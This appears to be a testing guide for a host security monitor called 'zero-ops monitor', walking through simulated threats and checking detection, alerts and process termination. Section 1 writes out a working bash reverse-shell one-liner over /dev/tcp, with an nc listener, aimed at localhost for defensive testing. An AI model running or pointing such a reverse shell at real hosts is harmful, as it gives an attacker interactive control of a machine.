# Simulation & Testing Guide: Security Monitor

This guide provides step-by-step instructions to simulate security threats and verify the detection capabilities of the `zero-ops monitor` tool.

---

## 1. Simulating a Reverse Shell (Linux/macOS)

A reverse shell occurs when a shell (like `bash`) initiates an outbound connection to a remote listener.

### **Step A: Start a Listener (Attacker)**
In one terminal, start a listener on port 4444:
```bash
nc -lp 4444
```

### **Step B: Initiate the Reverse Shell (Victim)**
In a second terminal, execute a bash reverse shell targeting the listener:
```bash
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```

### **Step C: Verify Detection**
In a third terminal, run the security scanner:
```bash
zero-ops monitor reverse-shell
```
**Expected Result:** The scanner should flag the `bash` process as a potential threat because it has an established connection and matches a sensitive binary signature.

---

## 2. Simulating a Hidden Listener (Public Exposure)

Malicious actors often leave "backdoors" or hidden listeners to regain access.

### **Step A: Create a Public Listener**
Start a simple Python-based web server listening on all interfaces (0.0.0.0):
```bash
python3 -m http.server 8888 --bind 0.0.0.0
```

### **Step B: Verify Detection**
Run the listeners audit:
```bash
zero-ops monitor listeners
```
**Expected Result:** The scanner should flag port 8888 with a **`[⚠️ PUBLIC]`** tag, indicating that it is exposed to the internet, not just localhost.

---

## 3. Testing Behavioral Baselining

This verify how the tool handles anomalies after a trusted state is established.

### **Step A: Capture Baseline**
Ensure your system is in a "known good" state and run:
```bash
zero-ops monitor baseline
```

### **Step B: Introduce an Anomaly**
Start any new network-connected application (e.g., `nc -l 9999`).

### **Step C: Verify Detection**
Run the network audit:
```bash
zero-ops monitor network
```
**Expected Result:** The new connection to port 9999 should be highlighted with a red **`[NEW]`** tag, whereas established connections from Step A remain clean.

---

## 4. Testing Integrated Background Alerts

### **Step A: Configure Telegram**
Ensure your Telegram bot is configured:
```bash
zero-ops telegram config set token "YOUR_TOKEN"
zero-ops telegram config set chat_id "YOUR_ID"
```

### **Step B: Start Daemon**
```bash
zero-ops monitor start
```

### **Step C: Trigger Threat**
Initiate the reverse shell from **Scenario 1**.

### **Step D: Verify Alert**
**Expected Result:** You should receive a Telegram notification within 10 seconds (default polling interval) containing the PID and process name of the suspicious shell.

---

## 5. Active Response Verification

### **Step A: Identify Threat**
Run `zero-ops monitor reverse-shell` and note the **PID**.

### **Step B: Kill Threat**
```bash
zero-ops monitor kill <PID>
```

### **Step C: Confirm Termination**
Run the scan again. The suspicious connection should no longer exist.

---

## **Clean Up**
After testing, always terminate your simulation processes (`nc`, `python`) and stop the monitor daemon:
```bash
zero-ops monitor stop
```
